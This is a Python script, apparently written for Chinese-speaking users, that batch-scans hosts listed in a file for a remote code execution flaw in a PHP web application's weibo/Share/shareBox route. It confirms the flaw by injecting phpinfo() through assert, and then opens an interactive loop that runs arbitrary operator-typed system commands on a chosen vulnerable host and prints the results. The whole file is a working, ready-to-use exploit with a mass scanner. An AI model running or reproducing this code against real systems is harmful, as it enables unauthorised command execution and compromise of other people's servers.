##!/usr/bin/python3
# -*- coding: utf-8 -*-
# @Author : may11
# @Time : 2023/11/27 18:01

import re
from queue import Queue
import bs4
import requests
import threading


def get_URL(ip_port):
    URL = 'http://' + ip_port + '/index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=phpinfo()'
    return URL

def check(ip, text):
    if "PHP Version" in text:
        with lock:
            print(f'{ip} 存在该漏洞！')
            result.add(ip)
    else:
        with lock:
            print(f'{ip} 不存在该漏洞！')

def get_target(ip_port):
    ip_port=ip_port.strip()
    URL='http://'+ip_port+'/index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule->_validationFieldItem%26id[4]=function%26id[0]=cmd%26id[1]=system%26id[args]=cmd='
    return URL

def get_command(command,URL):
    command=command.strip()
    target=URL+command
    return target


headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Upgrade-Insecure-Requests': '1',
}

print("----------漏洞检测开始----------")
result = set()
lock = threading.Lock()

# 编译正则表达式
pattern = re.compile(r'http://((?:\d{1,3}\.){3}\d{1,3}):(\d{1,5})')


class MyThread(threading.Thread):
    def __init__(self, queue):
        super().__init__()
        self.queue = queue

    def run(self):
        while True:
            URL = self.queue.get()
            match = pattern.search(URL)
            ip = match.group(1)
            port = match.group(2)
            result_1 = f"{ip}:{port}"
            try:
                response = requests.get(
                    url=URL,
                    headers=headers
                )
                check(result_1, response.text)
            except Exception:
                print(f'{result_1}不可达！')
            self.queue.task_done()


# 使用with语句创建线程并在结束时调用join方法
with threading.Lock():
    queue = Queue()
    for ip in open("url.txt"):
        ip = ip.strip()
        URL = get_URL(ip)
        queue.put(URL)

    for i in range(5):
        task = MyThread(queue)
        task.setDaemon(True)
        task.start()

    queue.join()

print("----------漏洞检测结束----------")
print("----------输出结果如下----------")
for i in result:
    print(i)
print("----------输出结果结束----------")
if (len(result)==0):
    print("无可利用目标，退出程序")
else:
    print('----------执行命令模式----------')
    while True:
        url = input("请输入执行命令的目标URL: ")
        if url == 'exit':
            print("----------退出命令执行模式----------")
            break
        while True:
            command = input("请输入你要执行的命令(输入exit则进入选择目标界面): ")
            if command == 'exit':
                print("已退出命令执行模式")
                break
            URL = get_target(url)
            target = get_command(command, URL)
            try:
                response = requests.get(
                    target,
                    headers=headers
                )
                soup = bs4.BeautifulSoup(response.text, 'lxml')
                target_div = soup.find('div', class_='col-xs-12')
                print("执行命令的结果如下: ")
                if target_div:
                    print(target_div.text.strip())
            except Exception:
                print("执行命令出现错误")
        print('----------执行命令结束----------')
print("程序退出")